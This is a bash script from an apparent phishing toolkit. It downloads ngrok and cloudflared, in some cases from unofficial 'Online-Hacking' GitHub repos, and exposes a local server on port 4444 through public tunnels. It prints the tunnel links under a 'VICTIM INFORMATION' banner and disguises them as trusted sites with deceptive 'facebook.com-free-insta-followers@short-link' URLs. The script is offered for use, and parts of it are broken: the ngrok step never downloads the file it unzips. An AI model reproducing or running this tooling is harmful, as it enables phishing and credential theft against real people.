#!/bin/bash




function setup_ngrok() {
	if [ ! -f  "${BIN}/ngrok" ]; then
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			ngrok_url="https://github.com/E343IO/stuff/raw/main/ngrok-2in1.zip"
		elif [[ "$arch" == *'aarch64'* ]]; then
                         if [[ "$ArNam" == *'amd64'* ]]; then
                              ngrok_url="https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/Ngrok/wifi%2Binternetdata/ngrok"
                        else
                              ngrok_url="https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/Ngrok/Ngrok%20Old/ngrok"
                         fi
		elif [[ "$arch" == *'x86_64'* ]]; then
		        if [[ "$ArNam" == *'amd64'* ]]; then 
                         ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
                        else
                         ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip"
                        fi
                else
                        ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip"
	        fi
		launch="installing server-2, size@4mb";splashdown="Installed.";echo
		
		unzip -q ngrok.zip && rm -rf ngrok.zip && chmod +x ngrok
        else
              echo ""
        fi
}


function setup_cloudflare() {
	if [ ! -f ${BIN}/cloudflared ]; then
             if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
		     cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
             elif [[ "$arch" == *'aarch64'* ]]; then
                     cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
             elif [[ "$arch" == *'x86_64'* ]]; then
                    if [[ "$ArNam" == *'amd64'* ]]; then
                                cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
                    else
                                cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
                    fi
             else
                                cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386"
             fi
	          launch="Installing server-1, size@25mb";splashdown="installed.";echo
	          (wget --quiet ${cloudd} -O cloudflared)& 
	          
        else 
	    echo ""
	fi
}

## Check Internet Status
check_status() {
	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
	timeout 3s curl -fIs "https://api.github.com" > /dev/null
	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" || echo -e "${RED}Offline${WHITE}"
}



link_server() {
rm -rf cld.log
echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Launching Cloudflared...\e[0m  "
			   echo -ne "  "
   		           if [[ `command -v termux-chroot` ]]; then
			  sleep 2 && termux-chroot cloudflared tunnel -url 127.0.0.1:4444 --logfile cld.log > /dev/null 2>&1 &
   			  else
     		           sleep 2 && ./cloudflared tunnel -url 127.0.0.1:4444 --logfile cld.log > /dev/null 2>&1 &
   	                 fi
			{ sleep 8; clear; }
				clink=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cld.log")
			   
			   echo ""
			   
			   echo -e $" \e[91m[\e[0m Online HacKing\e[91m]\e[1;92m Wait For Start.....\e[0m  "
			   echo -ne ""
                           if [[ `command -v termux-chroot` ]]; then
                           sleep 1 && termux-chroot ./ngrok http 127.0.0.1:4444 > /dev/null 2>&1 & 
                          else
                            sleep 1 && ./ngrok http 127.0.0.1:4444 > /dev/null 2>&1 &
                         fi
	                 { sleep 8; clear; }
	                       nlink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
			       echo ""
			   
   }


links() {
                           echo -e "\e[96m=======================\e[92m   SUMAN Â© 2022 FF  \e[96m=======================\e[92m"
                           echo -e " "
			   echo ""
                           echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;95m Link Not Received Manually - Open New Tab Run This Command: "
			   echo ""
			   echo -e " \e[33m | \e[1;92m./cloudflared-linux-386 http 4444 \e[33m||\e[92m ./ngrok http 4444 \e[33m|"
			   echo ""
			   echo -e " "
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Cloudflared Link :\e[0m\e[1;77m %s\e[0m\n" $clink                                   
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Ngrok Link :\e[0m\e[1;77m %s\e[0m\n" $nlink
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
			   echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Localhost Link :\e[0m\e[1;77m %s\e[0m\n" http://127.0.0.1:4444
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
			   echo ""
			   rm -rf cld.log
			   echo ""
			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
                           echo ""
}


function url_checker() {
        if [ ! "${1//:*}" = http ]; then
	        if [ ! "${1//:*}" = https ]; then
			echo
                        printf "${red} Invalid URL. Please use http or https. \n "
                        exit 1
		fi
	fi
}


# URL_SHORTNER
function url_shortner() {
        rm -rf uri.log
	#short=$(curl -s http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${ngrok_url})
	#short=$(curl -s https://vurl.com/api.php?url=${ngrok_url})
	#derek=$(curl -s https://is.gd/create.php\?format\=simple\&url=${link})
        #checking for is.gd is working or not.
        if [[ $derek == https://is.gd/[-0-9a-zA-Z]* ]]; then
        shorter=${derek#https://}
        else
        #short=$(curl -s https://soo.gd/api.php?url=${clink})
        curl -s https://api.shrtco.de/v2/shorten?url=${clink} >> log.URI 
        grep -o 'https:[^"]*' log.URI >> bURI
        rm log.URI
        sed 's/\\//g' bURI >> uri.log
        rm bURI
        short=$(grep -o 'https://9qr.de/[-0-9a-zA-Z]*' "uri.log")
        shorter=${short#https://}
        fi
        read -p $'\n\033[1;92mshark \033[1;97m>> \033[1;37mMask Your url domain here \033[1;93m(Ex. https://facebook.com) :\e[0m ' mask
        url_checker $mask
	printf "${green}shark ${white}>> ${white}Enter your key words ${yellow}: Ex. free-insta-followers\n"
	printf "${green}shark ${white}>> ${white}Don't use space in your words\n"
        read -p $'\e[1;92mshark \033[1;97m>> \e[1;37mEnter your words here :\e[0m ' words
        final_url=$mask-$words@$shorter
	printf "$final_url\n"
}

# ASK FOR URL MODIFICATION
function askuri() {
echo ""
read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Do You Want To Modify This Url \e[1;91m (Y/N) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'Y'* ]]; then
url_shortner

fi
if [[ $option == *'y'* ]]; then
url_shortner

fi

echo ""
}



check_status
sleep 3
setup_cloudflare
setup_ngrok
sleep 3
chmod +x cloudflared ngrok
link_server
sleep 3
links
askuri

ls
cat sh.ss
